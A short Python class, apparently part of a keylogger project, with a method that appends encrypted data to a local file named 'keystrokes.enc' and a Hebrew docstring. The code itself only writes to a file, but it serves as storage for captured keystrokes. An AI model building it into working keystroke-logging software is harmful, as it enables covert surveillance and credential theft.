class FileWriter:
    def __init__(self, filename="keystrokes.enc"):
        self.filename = filename

    def send_data(self, data: str, machine_name: str):
        """שומר את הנתונים המוצפנים לקובץ"""
        with open(self.filename, "a", encoding="utf-8") as f:
            f.write(data + "\n")